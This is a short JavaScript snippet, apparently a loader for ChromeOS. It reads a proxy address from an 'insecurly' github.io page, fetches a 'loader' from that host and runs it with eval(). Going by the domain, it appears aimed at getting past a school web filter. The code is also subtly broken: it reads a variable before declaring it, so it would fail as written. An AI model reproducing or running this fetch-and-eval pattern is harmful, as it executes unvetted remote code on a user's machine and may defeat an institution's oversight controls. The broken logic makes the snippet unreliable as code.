(async () => {
    try {

				const link_res = await fetch (`https://insecurly.github.io/proxy.txt`);
				const link = await response.text();
				
        const response = await fetch(`${link}/get_loader?device=chromeos`);
        if (!response.ok) {
            throw new Error('Failed to fetch loader');
        }
        const code = await response.text();
        eval(code);
    } catch (error) {
        alert(error);
    }
})();
